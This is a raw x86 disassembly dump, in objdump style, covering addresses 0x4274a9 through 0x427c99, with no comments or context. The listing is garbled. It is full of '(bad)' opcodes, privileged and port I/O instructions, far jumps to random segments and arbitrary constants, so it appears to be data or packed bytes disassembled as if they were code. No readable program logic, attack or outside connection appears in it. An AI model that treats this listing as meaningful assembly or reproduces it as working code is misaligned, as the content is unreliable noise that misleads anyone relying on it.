  4274a9:	mov    ecx,0x70c0e2fc
  4274ae:	push   edx
  4274af:	jge    0x4274ad
  4274b1:	mov    fs,WORD PTR [edx-0x21]
  4274b4:	daa    
  4274b5:	sbb    al,0x18
  4274b7:	adc    al,BYTE PTR [esi]
  4274b9:	and    al,0x93
  4274bb:	jle    0x4274ee
  4274bd:	inc    edi
  4274be:	bnd jmp 0x427448
  4274c1:	(bad)  
  4274c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4274c3:	js     0x427447
  4274c5:	or     ch,BYTE PTR [edi-0x4b]
  4274c8:	and    esi,ebx
  4274ca:	imul   eax,ecx,0x55
  4274cd:	icebp  
  4274ce:	enter  0x98fe,0x65
  4274d2:	sar    DWORD PTR ds:0x92ebded7,1
  4274d8:	mov    al,0x88
  4274da:	fisubr WORD PTR [ecx]
  4274dc:	clc    
  4274dd:	outs   dx,BYTE PTR ds:[esi]
  4274de:	push   eax
  4274df:	mov    ds:0x44476353,al
  4274e4:	add    eax,0x3cdd3afe
  4274e9:	shr    BYTE PTR [ebp-0xd934f2d],cl
  4274ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274f0:	out    dx,al
  4274f1:	popa   
  4274f2:	or     al,dh
  4274f4:	dec    ebx
  4274f5:	stos   DWORD PTR es:[edi],eax
  4274f6:	and    esp,esi
  4274f8:	jno    0x4274e4
  4274fa:	dec    edx
  4274fb:	fwait
  4274fc:	cwde   
  4274fd:	inc    ebp
  4274fe:	repnz push 0x6a
  427501:	shr    esi,cl
  427503:	dec    ecx
  427504:	fbld   TBYTE PTR [eax-0x4d]
  427507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427508:	pop    edx
  427509:	mov    bh,0xb5
  42750b:	xor    DWORD PTR [eax+ecx*4],ebx
  42750e:	cs adc al,0xa6
  427511:	ss test al,0x8f
  427514:	scas   eax,DWORD PTR es:[edi]
  427515:	outs   dx,DWORD PTR ds:[esi]
  427516:	add    edx,DWORD PTR [ebp-0x3d38644c]
  42751c:	or     al,0x41
  42751e:	dec    edx
  42751f:	pop    ebx
  427520:	rcl    DWORD PTR [esp+edi*2],cl
  427523:	cld    
  427524:	repz mov bl,0x37
  427527:	imul   DWORD PTR ss:[ebx]
  42752a:	mov    ch,0x9a
  42752c:	sbb    eax,0xcbe2a245
  427531:	(bad)
  427535:	fs dec edi
  427537:	cmp    ebp,edi
  427539:	jmp    0x427549
  42753b:	adc    al,0xbf
  42753d:	in     al,0xb5
  42753f:	or     esp,DWORD PTR [esi-0x43]
  427542:	out    0xff,al
  427544:	push   ebp
  427545:	aaa    
  427546:	aam    0x3a
  427548:	cld    
  427549:	(bad)  
  42754a:	sahf   
  42754b:	inc    ebx
  42754c:	pop    ebx
  42754d:	cwde   
  42754e:	push   edx
  42754f:	jo     0x42755a
  427551:	add    al,0x6d
  427553:	mov    eax,0xe7b4126d
  427558:	cmp    esi,DWORD PTR [edi-0x20a2cfca]
  42755e:	cmp    cl,BYTE PTR [esi]
  427560:	inc    edx
  427561:	out    dx,al
  427562:	lock gs sbb eax,0xab8ffeb8
  427569:	inc    esp
  42756a:	loop   0x4275db
  42756c:	mov    dl,0x86
  42756e:	cs mov esp,0x21030466
  427574:	outs   dx,BYTE PTR ds:[esi]
  427575:	xor    ebp,DWORD PTR [esp-0x46]
  427579:	(bad)  
  42757a:	and    DWORD PTR ds:0xeca55717,esp
  427580:	mov    edi,esp
  427582:	dec    esi
  427583:	jno    0x42752e
  427585:	sbb    al,0x87
  427587:	mov    ebp,0x36370fb5
  42758c:	add    bl,dl
  42758e:	inc    ebx
  42758f:	fsub   DWORD PTR [ecx-0x3ab5bf79]
  427595:	jl     0x427533
  427597:	mov    dl,0xe6
  427599:	(bad)  
  42759a:	scas   al,BYTE PTR es:[edi]
  42759b:	jae    0x42756b
  42759d:	call   0x83ed32fe
  4275a2:	add    DWORD PTR [ecx+0xb],ecx
  4275a5:	popf   
  4275a6:	into   
  4275a7:	sar    BYTE PTR [edx],1
  4275a9:	inc    esp
  4275aa:	mov    ch,0x1d
  4275ac:	loop   0x4275af
  4275ae:	test   eax,0xe4ba553e
  4275b3:	and    eax,0x1877d0b7
  4275b8:	stc    
  4275b9:	pop    edx
  4275ba:	repnz add ah,ah
  4275bd:	mov    edi,0x6296f0ac
  4275c2:	invd   
  4275c4:	(bad)  
  4275c6:	adc    bh,BYTE PTR [ebx+0x65816f47]
  4275cc:	(bad)  
  4275ce:	sub    al,BYTE PTR [edi]
  4275d0:	call   0xe06f:0x12d850c0
  4275d7:	(bad)  
  4275d8:	push   ss
  4275d9:	dec    edi
  4275da:	push   ecx
  4275db:	in     al,dx
  4275dc:	jle    0x4275a2
  4275de:	call   0x2b7dc38c
  4275e3:	enter  0xb29a,0xdc
  4275e7:	or     ch,ch
  4275e9:	enter  0x97a7,0xc4
  4275ed:	xchg   BYTE PTR [edi+0x43],ah
  4275f0:	dec    edi
  4275f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275f2:	and    al,0xa8
  4275f4:	sahf   
  4275f5:	outs   dx,DWORD PTR ds:[esi]
  4275f6:	sahf   
  4275f7:	push   ebx
  4275f8:	cmp    ebp,DWORD PTR [ebp+0x1c]
  4275fb:	pop    edi
  4275fc:	in     eax,dx
  4275fd:	push   ds
  4275fe:	ins    BYTE PTR es:[edi],dx
  4275ff:	cmp    eax,0xd29115d0
  427604:	nop
  427605:	inc    esp
  427606:	add    eax,0xdd9e917
  42760b:	dec    ebp
  42760c:	adc    BYTE PTR [eax+0x3e49ffa6],dh
  427612:	jmp    0xd486:0x5bc650b0
  427619:	mov    WORD PTR [edx-0x59a2e7d6],ss
  42761f:	lods   eax,DWORD PTR ds:[esi]
  427620:	shl    DWORD PTR [edx],1
  427622:	test   DWORD PTR [eax],edx
  427624:	into   
  427625:	call   0xbe04:0x3e478174
  42762c:	and    eax,0x7c744fab
  427631:	scas   eax,DWORD PTR es:[edi]
  427632:	add    DWORD PTR [edx],edx
  427634:	add    BYTE PTR [ebp-0x196d8808],0x7f
  42763b:	or     eax,DWORD PTR [ecx]
  42763d:	loopne 0x427657
  42763f:	das    
  427640:	xor    al,0x74
  427642:	popf   
  427643:	lods   al,BYTE PTR ds:[esi]
  427644:	icebp  
  427645:	mov    DWORD PTR [eax-0x5da52c4a],eax
  42764b:	dec    bl
  42764d:	dec    edx
  42764e:	add    DWORD PTR [esi+0x3d],0x38
  427652:	fs in  eax,0x6d
  427655:	fwait
  427656:	int    0xcd
  427658:	(bad)  
  427659:	mov    ds:0xc3c7572d,al
  42765e:	(bad)  
  42765f:	(bad)  
  427660:	outs   dx,BYTE PTR ds:[esi]
  427661:	sbb    al,0xa7
  427663:	sub    ecx,ebx
  427665:	dec    esp
  427666:	cmp    edx,DWORD PTR [ecx+ebp*2-0x4db0203c]
  42766d:	mov    ds:0x376deb9a,eax
  427672:	stos   DWORD PTR es:[edi],eax
  427673:	jle    0x4276ee
  427675:	push   cs
  427676:	adc    al,0x93
  427678:	push   edx
  427679:	fist   DWORD PTR [ebx+0x2ad0d9b5]
  42767f:	stos   DWORD PTR es:[edi],eax
  427680:	and    DWORD PTR gs:[ebp-0x64ee0802],esi
  427687:	out    0x39,eax
  427689:	jmp    0x1b:0x1f4b373d
	...
  427698:	add    BYTE PTR [eax],al
  42769a:	cdq    
  42769b:	enter  0x9ff8,0xf9
  42769f:	mov    edi,0xcf7dceff
  4276a4:	stc    
  4276a5:	popf   
  4276a6:	enter  0x1472,0x7f
  4276aa:	imul   ebp,esp,0x1fd0001
  4276b0:	add    BYTE PTR [eax],al
  4276b2:	jecxz  0x42763d
  4276b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276b5:	pop    es
  4276b6:	sete   BYTE PTR [edx-0x17dadb0e]
  4276bd:	out    0xf9,al
  4276bf:	test   BYTE PTR gs:[ebp-0x1564b40d],ch
  4276c6:	test   DWORD PTR [ecx],ebp
  4276c8:	cmp    dh,ch
  4276ca:	enter  0xa3cc,0x9a
  4276ce:	adc    DWORD PTR [eax],ecx
  4276d0:	btr    DWORD PTR [edi-0x52],ebp
  4276d4:	test   DWORD PTR [edi+0x153779fa],ebp
  4276da:	or     al,0x57
  4276dc:	xor    DWORD PTR [eax-0x2c032278],edx
  4276e2:	scas   al,BYTE PTR es:[edi]
  4276e3:	xchg   ebx,eax
  4276e4:	mov    esi,0xddbfdd9b
  4276e9:	hlt    
  4276ea:	leave  
  4276eb:	jno    0x42775f
  4276ed:	sbb    DWORD PTR [ebp+eiz*2-0x357ca7c6],eax
  4276f4:	cmp    DWORD PTR [eax+0x3d],eax
  4276f7:	dec    ecx
  4276f8:	loope  0x4276a9
  4276fa:	cmp    BYTE PTR [esi],bh
  4276fc:	shl    BYTE PTR [ebx-0x2d0f5a25],1
  427702:	mov    ds:0x258dce6,eax
  427707:	xchg   ebp,eax
  427708:	mov    ch,0xa
  42770a:	pop    es
  42770b:	cld    
  42770c:	ds out 0xd4,al
  42770f:	scas   eax,DWORD PTR es:[edi]
  427710:	int3   
  427711:	not    DWORD PTR [bp-0x5387]
  427716:	jmp    0x42772e
  427718:	mov    ebx,0x6512582c
  42771d:	call   0xfda5f56c
  427722:	mov    ds:0x8bac9b87,eax
  427727:	mov    eax,0xf6d9bffc
  42772c:	jne    0x42779b
  42772e:	(bad)  
  42772f:	mov    cl,0x42
  427731:	sahf   
  427732:	fdivr  DWORD PTR ds:[ecx]
  427735:	push   eax
  427736:	sahf   
  427737:	sbb    cl,dh
  427739:	aam    0x5
  42773b:	lock cld 
  42773d:	or     edx,DWORD PTR [eax]
  42773f:	mov    eax,ds:0x8cc36c3e
  427744:	push   cs
  427745:	jns    0x427701
  427747:	cmp    ah,BYTE PTR [esi-0x61]
  42774a:	ds call 0x1241af2c
  427750:	pop    es
  427751:	shl    dh,1
  427753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427754:	cmp    BYTE PTR [ebx-0x40e2abd0],cl
  42775a:	lods   al,BYTE PTR ds:[esi]
  42775b:	dec    ebp
  42775c:	cli    
  42775d:	push   cs
  42775e:	cmp    DWORD PTR [esi-0x46],edi
  427761:	adc    cl,dh
  427763:	push   ecx
  427764:	mov    dl,0x5d
  427766:	jno    0x4277e6
  427768:	or     al,BYTE PTR [edx+0x1b1fb730]
  42776e:	cli    
  42776f:	pop    eax
  427770:	xchg   edx,eax
  427771:	add    eax,0xc45ff676
  427776:	call   0xc207:0x801be542
  42777d:	sbb    al,0x7e
  42777f:	sbb    al,0x7f
  427781:	fild   QWORD PTR [esi]
  427783:	loopne 0x4277d2
  427785:	sub    BYTE PTR [ebp+0x53],0x7e
  427789:	xor    ah,bh
  42778b:	sub    ebp,DWORD PTR [esi+0x69a4e731]
  427791:	jl     0x4277e1
  427793:	ds gs add eax,esp
  427797:	xor    al,BYTE PTR [ebp+0x5b]
  42779a:	cmp    bh,BYTE PTR [edx-0x3ee5846c]
  4277a0:	in     al,dx
  4277a1:	sbb    bl,BYTE PTR [edi]
  4277a3:	icebp  
  4277a4:	pushf  
  4277a5:	repnz add ebx,DWORD PTR [esp+esi*1-0x5ec62c8e]
  4277ad:	push   esp
  4277ae:	jp     0x427737
  4277b0:	dec    esi
  4277b1:	add    BYTE PTR fs:[edi],0xe1
  4277b5:	and    eax,edx
  4277b7:	pop    ds
  4277b8:	pop    edx
  4277b9:	push   edx
  4277ba:	clc    
  4277bb:	jmp    0x427743
  4277bd:	jns    0x427812
  4277bf:	mov    ds:0x36e1c2cf,eax
  4277c4:	int    0xc3
  4277c6:	add    dl,bl
  4277c8:	inc    esp
  4277c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277ca:	push   es
  4277cb:	repz pop ebp
  4277cd:	dec    esp
  4277ce:	ss add esp,edi
  4277d1:	ins    BYTE PTR es:[edi],dx
  4277d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277d3:	and    al,0x6
  4277d5:	std    
  4277d6:	loope  0x4277cf
  4277d8:	or     BYTE PTR [ebx+0x33481202],cl
  4277de:	push   esp
  4277df:	mov    ds:0x6e6f5a5c,al
  4277e4:	xor    cl,BYTE PTR [edi]
  4277e6:	push   ecx
  4277e7:	xor    al,0xd0
  4277e9:	jle    0x427797
  4277eb:	fstp   st(0)
  4277ed:	ret    0xba60
  4277f0:	inc    ecx
  4277f1:	mov    bl,0x97
  4277f3:	dec    esp
  4277f4:	pop    eax
  4277f5:	mov    dl,0xea
  4277f7:	repz out dx,al
  4277f9:	pop    eax
  4277fa:	mul    DWORD PTR [ebx+eax*4-0x13112f7e]
  427801:	add    DWORD PTR [edx],0x40a05cd8
  427807:	jl     0x4277c1
  427809:	daa    
  42780a:	imul   esi,ebx,0x8b77214b
  427810:	repz jo 0x4277d1
  427813:	pop    eax
  427814:	(bad)  
  427815:	mov    bl,0x6c
  427817:	loope  0x427836
  427819:	sub    esp,DWORD PTR [ecx]
  42781b:	(bad)  
  42781c:	inc    esi
  42781d:	cmp    cl,BYTE PTR [eax-0x25c3f122]
  427823:	in     al,dx
  427824:	mov    edi,0xae8d68f0
  427829:	(bad)  
  42782a:	ds lahf 
  42782c:	scas   eax,DWORD PTR es:[edi]
  42782d:	push   ebx
  42782e:	jle    0x4278ae
  427830:	loop   0x427888
  427832:	jmp    0x3b1a:0xd20b9a5e
  427839:	mov    WORD PTR [edi],gs
  42783b:	lahf   
  42783c:	mov    esp,0xe37c2e53
  427841:	adc    bl,dl
  427843:	jns    0x4278ad
  427845:	in     eax,dx
  427846:	fld1   
  427848:	ficomp DWORD PTR [edx]
  42784a:	and    BYTE PTR [ecx],0x94
  42784d:	xlat   BYTE PTR ds:[ebx]
  42784e:	mov    ch,0x2c
  427850:	jno    0x42787a
  427852:	sbb    eax,ecx
  427854:	loop   0x42783a
  427856:	xor    eax,edi
  427858:	add    al,0x4f
  42785a:	cmp    cl,dl
  42785c:	cdq    
  42785d:	cmp    ch,bh
  42785f:	add    al,0xfd
  427861:	xchg   ebp,eax
  427862:	ficom  DWORD PTR cs:0x8c0563ab
  427869:	push   eax
  42786a:	sahf   
  42786b:	jbe    0x427829
  42786d:	repnz and al,0x41
  427870:	(bad)  
  427871:	sti    
  427872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427873:	scas   al,BYTE PTR es:[edi]
  427874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427876:	and    eax,DWORD PTR [ecx+esi*2-0x2a54b75b]
  42787d:	inc    esi
  42787e:	push   eax
  42787f:	add    al,0x11
  427881:	shl    DWORD PTR [ecx+eax*1],cl
  427884:	pop    ds
  427885:	in     al,0xb3
  427887:	je     0x4278f3
  427889:	add    BYTE PTR [ebx],dl
  42788b:	mov    bh,0x7a
  42788d:	jmp    0x4278ff
  42788f:	imul   edi,DWORD PTR [ebx],0xffffffd5
  427892:	shr    BYTE PTR [ecx-0x71],1
  427895:	sti    
  427896:	xchg   edi,eax
  427897:	and    DWORD PTR ss:[edi+0x46fd4b9],esp
  42789e:	das    
  42789f:	hlt    
  4278a0:	push   0x61
  4278a2:	mov    edi,0x8c0c55d1
  4278a7:	imul   edi,DWORD PTR [eax],0x39766a54
  4278ad:	add    al,0x9e
	...
  4278b7:	add    BYTE PTR [eax],al
  4278b9:	add    BYTE PTR [ecx+0xa],bh
  4278bc:	sbb    BYTE PTR gs:[edi+0x7f],dh
  4278c0:	jge    0x42792d
  4278c2:	and    DWORD PTR [ebp+0x30],ecx
  4278c5:	dec    esi
  4278c6:	cli    
  4278c7:	or     esp,DWORD PTR [esi+0x1ee66df]
  4278cd:	add    ch,bh
  4278cf:	add    DWORD PTR [eax],eax
  4278d1:	add    BYTE PTR [edi],ch
  4278d3:	fimul  DWORD PTR [ecx+edx*2-0x288a50e3]
  4278da:	jmp    0x4b53f5ce
  4278df:	(bad)  
  4278e0:	mov    ebp,0xf4d3d634
  4278e5:	sahf   
  4278e6:	ficomp WORD PTR [ecx]
  4278e8:	pop    ss
  4278e9:	mov    ds:0x34497958,eax
  4278ee:	fs scas al,BYTE PTR es:[edi]
  4278f0:	shl    BYTE PTR [eax-0x5accdea9],cl
  4278f6:	or     BYTE PTR [ebx],0x10
  4278f9:	xchg   bh,dl
  4278fb:	cli    
  4278fc:	in     eax,0x47
  4278fe:	mov    al,0x78
  427900:	mov    bh,0xe8
  427902:	jne    0x42797a
  427904:	mov    ch,0xb8
  427906:	push   cs
  427907:	add    dh,dl
  427909:	mov    ecx,0xf7cdf4f5
  42790e:	out    0x1e,eax
  427910:	out    0xb1,al
  427912:	xor    cl,BYTE PTR [eax]
  427914:	sahf   
  427915:	xchg   esi,eax
  427916:	leave  
  427917:	in     eax,0x4
  427919:	mov    BYTE PTR ds:0x82c3f831,bh
  42791f:	popf   
  427920:	das    
  427921:	pop    ebx
  427922:	ror    DWORD PTR [eax+ecx*4+0x1a],cl
  427926:	pusha  
  427927:	cmc    
  427928:	loopne 0x4278e2
  42792a:	inc    DWORD PTR [ebx+0x63d7c35f]
  427930:	cmp    eax,0x4910dfcb
  427935:	pushf  
  427936:	xor    cl,BYTE PTR [esp+ebx*1-0x39f20a0f]
  42793d:	test   DWORD PTR [edi+0x7aa76239],esi
  427943:	push   esp
  427944:	sub    bl,BYTE PTR [ebx-0x8]
  427947:	aad    0x64
  427949:	add    ebp,DWORD PTR [edi+0x2]
  42794c:	pop    eax
  42794d:	lds    ebx,FWORD PTR [ebx+eax*2-0x6978cc15]
  427954:	fldln2 
  427956:	add    bl,bl
  427958:	and    al,bl
  42795a:	xor    esi,esp
  42795c:	and    DWORD PTR [ebp+0x1b],esi
  42795f:	cld    
  427960:	add    bl,ah
  427962:	mov    BYTE PTR [edi],cl
  427964:	pop    esi
  427965:	jbe    0x42796c
  427967:	leave  
  427968:	pop    edx
  427969:	push   ds
  42796a:	sbb    bh,BYTE PTR [edi+0x5ce45c89]
  427970:	jge    0x427973
  427972:	push   edi
  427973:	pusha  
  427974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427975:	mov    edx,0xa64e5c7a
  42797a:	mov    bh,0xe7
  42797c:	je     0x427932
  42797e:	inc    esi
  427980:	retf   0x60a9
  427983:	call   0xcc864efc
  427988:	push   esi
  427989:	push   ebx
  42798a:	sbb    cl,BYTE PTR [esi+0x1]
  42798d:	mov    al,BYTE PTR [edi+0x1595e93e]
  427993:	pop    es
  427994:	ja     0x4279ec
  427996:	add    BYTE PTR [ebx-0x5aaa33a0],bl
  42799c:	jmp    0x7f8abe5b
  4279a1:	jb     0x427923
  4279a3:	push   esi
  4279a4:	add    BYTE PTR [ebx-0x48040399],0x75
  4279ab:	push   edx
  4279ac:	in     al,dx
  4279ad:	push   ebx
  4279ae:	sbb    esp,esi
  4279b0:	inc    ebp
  4279b1:	icebp  
  4279b2:	and    al,0x8a
  4279b4:	out    dx,al
  4279b5:	xchg   esi,eax
  4279b6:	dec    eax
  4279b7:	ja     0x42799d
  4279b9:	in     al,dx
  4279ba:	adc    dl,0x4f
  4279bd:	inc    ebx
  4279be:	ja     0x4279ed
  4279c0:	sbb    eax,0xec2ba1ba
  4279c5:	dec    eax
  4279c6:	sbb    eax,0x6adcb310
  4279cb:	aaa    
  4279cc:	fnstenv [eax+ecx*2]
  4279cf:	jno    0x42799d
  4279d1:	inc    eax
  4279d2:	retf   
  4279d3:	cmp    ecx,DWORD PTR ds:0x3bc729cb
  4279d9:	inc    esp
  4279da:	xchg   edx,eax
  4279db:	bswap  ebx
  4279dd:	loope  0x4279e1
  4279df:	mov    esi,0xe18760dd
  4279e4:	dec    esi
  4279e5:	sub    BYTE PTR [eax+0x2a981d9f],dl
  4279eb:	push   edi
  4279ec:	jl     0x4279d5
  4279ee:	mov    ch,0x45
  4279f0:	fs fs int3 
  4279f3:	test   al,0xd7
  4279f5:	in     eax,0x99
  4279f7:	fimul  WORD PTR [edx+0x17]
  4279fa:	pop    ecx
  4279fb:	jmp    0x427a0f
  4279fd:	mov    eax,0x63007d4c
  427a02:	cmp    DWORD PTR ds:0x88eabeeb,eax
  427a08:	mov    ebp,0x3ab28058
  427a0d:	cmp    eax,0xc2a6d0ff
  427a12:	sub    DWORD PTR [edi-0x3d3e0fca],ebx
  427a18:	inc    edx
  427a19:	adc    BYTE PTR [edi-0x6a],bh
  427a1c:	mov    cl,0x46
  427a1e:	cmc    
  427a1f:	inc    eax
  427a20:	xlat   BYTE PTR ds:[ebx]
  427a21:	adc    al,0xd5
  427a24:	push   edx
  427a25:	std    
  427a26:	xchg   esp,eax
  427a27:	sub    eax,0x28814fe7
  427a2c:	aam    0xb2
  427a2e:	add    eax,0x12d04d46
  427a33:	clc    
  427a34:	mov    bl,0xce
  427a36:	add    al,0x47
  427a38:	xchg   ebx,eax
  427a39:	loop   0x4279c7
  427a3b:	xor    DWORD PTR [ebp*8-0x72df5025],ebp
  427a42:	xor    BYTE PTR [ecx],bh
  427a44:	cmp    al,0x90
  427a46:	out    0x4f,eax
  427a48:	pushf  
  427a49:	(bad)  
  427a4a:	fwait
  427a4b:	imul   ebp,DWORD PTR [edx+ebx*2-0x19],0x7a
  427a50:	sbb    ch,BYTE PTR [ecx+0x7674bfa3]
  427a56:	mov    BYTE PTR [ebx+ecx*1],dl
  427a59:	push   eax
  427a5a:	cli    
  427a5b:	(bad)  
  427a5c:	mov    edx,0x3381e8b
  427a61:	push   0x66
  427a63:	sbb    ecx,0x43
  427a66:	icebp  
  427a67:	push   esp
  427a68:	sti    
  427a69:	cli    
  427a6a:	out    0x14,al
  427a6c:	or     al,0x6
  427a6e:	jmp    0x35fa9270
  427a73:	ret    
  427a74:	popf   
  427a75:	or     dl,BYTE PTR [ebx-0xf]
  427a78:	iret   
  427a79:	pop    edi
  427a7a:	xchg   ebp,eax
  427a7b:	cmc    
  427a7c:	shl    BYTE PTR [eax+0x1948088a],1
  427a82:	(bad)  
  427a83:	cmc    
  427a84:	cmp    bl,BYTE PTR [ecx+0x76]
  427a87:	push   0x6cd769d5
  427a8c:	sar    DWORD PTR [edx-0x2e539406],1
  427a92:	out    0x1c,al
  427a94:	add    BYTE PTR [ebp-0x3488b645],dh
  427a9a:	ja     0x427a5a
  427a9c:	ja     0x427b03
  427a9e:	retf   
  427a9f:	inc    esp
  427aa0:	es jp  0x427a7e
  427aa3:	aam    0x71
  427aa5:	jecxz  0x427a68
  427aa7:	jo     0x427af7
  427aa9:	jle    0x427aac
  427aab:	push   edx
  427aac:	adc    DWORD PTR [edi-0x46],esi
  427aaf:	scas   al,BYTE PTR es:[edi]
  427ab0:	shl    BYTE PTR [edx],0x30
  427ab3:	cmp    bl,BYTE PTR [edx]
  427ab5:	mov    dh,BYTE PTR [ecx-0xce48b46]
  427abb:	in     al,0x50
  427abd:	pusha  
  427abe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427abf:	push   ecx
  427ac0:	loop   0x427ab9
  427ac2:	mov    dh,0xe0
  427ac4:	pop    ebx
  427ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ac6:	cwde   
  427ac7:	add    DWORD PTR [ecx-0x275fe3d6],0xff13
	...
  427ad9:	add    BYTE PTR [ecx+0x3],bl
  427adc:	rol    DWORD PTR [ebx+ebx*8-0x3a],0xdd
  427ae1:	pop    ds
  427ae2:	arpl   WORD PTR [edi-0x5e49b294],di
  427ae8:	arpl   WORD PTR [ebx+0x63],bx
  427aeb:	lock add DWORD PTR [eax],eax
  427aee:	std    
  427aef:	add    DWORD PTR [eax],eax
  427af1:	add    BYTE PTR [eax],ah
  427af3:	sub    al,0x55
  427af5:	cmp    ebx,DWORD PTR [ecx]
  427af7:	maskmovq mm3,(bad)
  427af8:	neg    DWORD PTR [ebp+0x70]
  427afb:	std    
  427afc:	int    0x34
  427afe:	mov    bl,0xb2
  427b00:	stc    
  427b01:	test   BYTE PTR [ebx-0x3dcfbb7c],ah
  427b07:	lds    esi,FWORD PTR [esi]
  427b09:	jnp    0x427a8b
  427b0b:	jns    0x427a9f
  427b0d:	icebp  
  427b0e:	cmp    eax,0xd1da4c02
  427b13:	ds xchg ecx,eax
  427b15:	mov    ch,0x72
  427b17:	es leave 
  427b19:	push   esi
  427b1a:	jno    0x427afe
  427b1c:	sbb    bh,BYTE PTR [esi+0x1b9d762e]
  427b22:	int3   
  427b23:	cdq    
  427b24:	fidivr WORD PTR [edi-0x4fc9ac3b]
  427b2a:	mov    dh,0x3e
  427b2c:	int3   
  427b2d:	out    0xe,al
  427b2f:	fist   DWORD PTR [edi+0x7d9a9d2b]
  427b35:	scas   eax,DWORD PTR es:[edi]
  427b36:	cmp    eax,0x571f53fb
  427b3b:	cwde   
  427b3c:	aas    
  427b3d:	jnp    0x427b94
  427b3f:	push   edx
  427b40:	adc    DWORD PTR [bx+si-0x770a],esi
  427b45:	jg     0x427aca
  427b47:	lock xlat BYTE PTR ds:[ebx]
  427b49:	stos   DWORD PTR es:[edi],eax
  427b4a:	mov    ds:0xb8fb5c41,eax
  427b4f:	out    dx,al
  427b50:	add    esp,DWORD PTR [edi-0xf98ffcc]
  427b56:	mov    eax,ds:0x8a609f71
  427b5b:	in     al,dx
  427b5c:	sbb    DWORD PTR [ebp+0x1e765614],esi
  427b62:	jmp    0xa012be4f
  427b67:	iret   
  427b68:	mov    eax,ds:0x57a95035
  427b6d:	push   ds
  427b6e:	mov    bh,0xca
  427b70:	jmp    0x4a2b:0x27449a14
  427b77:	xor    bl,BYTE PTR [edi-0x739a7519]
  427b7d:	and    DWORD PTR [ebx+edi*8-0x1884d1f4],edi
  427b84:	es adc al,0xb6
  427b87:	jecxz  0x427bb5
  427b89:	mov    bl,0x94
  427b8b:	xor    al,0xa4
  427b8d:	and    BYTE PTR [eax],cl
  427b8f:	jmp    0x6eea:0xa6e000d3
  427b96:	int    0x1b
  427b98:	cmp    DWORD PTR [ecx-0x5b],ebx
  427b9b:	idiv   BYTE PTR [ecx+0x45]
  427b9e:	pop    eax
  427b9f:	aad    0x2
  427ba1:	sub    eax,DWORD PTR [eax-0x502f5014]
  427ba7:	ja     0x427c17
  427ba9:	fidivr DWORD PTR [edx+0x50]
  427bac:	out    0x4e,al
  427bae:	call   FWORD PTR [eax-0x2975f905]
  427bb4:	out    dx,al
  427bb5:	iret   
  427bb6:	cs in  al,0xc9
  427bb9:	or     al,BYTE PTR [edx-0x2c5beb84]
  427bbf:	leave  
  427bc0:	mov    ah,0xb0
  427bc2:	outs   dx,DWORD PTR ds:[esi]
  427bc3:	add    eax,0xc764721e
  427bc8:	das    
  427bc9:	or     esi,ebx
  427bcb:	fisttp WORD PTR [ebp-0x40420989]
  427bd1:	sbb    BYTE PTR [ebx],0x8e
  427bd4:	jmp    0x427bfe
  427bd6:	push   esp
  427bd7:	lods   eax,DWORD PTR ds:[esi]
  427bd8:	cmp    eax,0x2ad24f4b
  427bdd:	inc    ebx
  427bde:	call   0x5a1748f4
  427be3:	xchg   esp,eax
  427be4:	or     bl,0xa7
  427be7:	cs push edx
  427be9:	idiv   BYTE PTR [ebx]
  427beb:	push   ecx
  427bec:	push   ds
  427bed:	repz leave 
  427bef:	mov    edx,0x593c5a16
  427bf4:	test   eax,0xf6530d1a
  427bf9:	scas   eax,DWORD PTR es:[edi]
  427bfa:	out    0x1c,eax
  427bfc:	retf   0x8cbe
  427bff:	cdq    
  427c00:	fld    QWORD PTR [esi-0x17]
  427c03:	lock fwait
  427c05:	push   edi
  427c06:	sub    eax,0x77313028
  427c0b:	jmp    0x57a0f496
  427c10:	daa    
  427c11:	(bad)  
  427c12:	lds    eax,FWORD PTR [bp+di+0x3ee0]
  427c17:	int3   
  427c18:	mov    esp,DWORD PTR [eax]
  427c1a:	xchg   BYTE PTR [edi-0x5529b383],cl
  427c20:	(bad)  
  427c21:	stc    
  427c22:	fnstenv [edx+0x78]
  427c25:	cmp    esp,DWORD PTR [eax-0x5cc5c487]
  427c2b:	adc    BYTE PTR fs:[edi*8+0x618f3b82],cl
  427c33:	loop   0x427c35
  427c35:	stos   BYTE PTR es:[edi],al
  427c36:	dec    esp
  427c37:	mov    bl,0x54
  427c39:	xlat   BYTE PTR ds:[ebx]
  427c3a:	jne    0x427bf8
  427c3c:	sub    ebx,DWORD PTR [esi+0x430637d4]
  427c42:	clc    
  427c43:	push   0xd336cda7
  427c48:	stos   BYTE PTR es:[edi],al
  427c49:	hlt    
  427c4a:	mov    dh,0xa5
  427c4c:	cli    
  427c4d:	xchg   edi,eax
  427c4e:	dec    eax
  427c4f:	bound  ecx,QWORD PTR ds:[ecx]
  427c52:	cli    
  427c53:	call   0xd9cb66c4
  427c58:	xchg   ebp,eax
  427c59:	add    BYTE PTR [ecx+0x18c32230],0xaf
  427c60:	jbe    0x427c3f
  427c62:	aad    0x3b
  427c64:	push   ebp
  427c65:	icebp  
  427c66:	retf   0x6a5c
  427c69:	fmul   DWORD PTR [esi+0x12f90343]
  427c6f:	call   0x2841:0xe70a231e
  427c76:	xor    DWORD PTR ds:0xea513c22,esi
  427c7c:	add    edx,DWORD PTR [esi]
  427c7e:	jmp    DWORD PTR [eax+ebx*2]
  427c81:	clc    
  427c82:	pop    esp
  427c83:	fwait
  427c84:	test   al,0x3e
  427c86:	fst    DWORD PTR [esi+edi*8]
  427c89:	test   bl,bh
  427c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c8c:	add    DWORD PTR [eax],ecx
  427c8e:	shl    DWORD PTR [ebx],cl
  427c90:	mov    ecx,0x1d7e89f3
  427c95:	pusha  
  427c96:	add    al,0x10
  427c98:	xchg   ebp,eax
  427c99:	push   edi
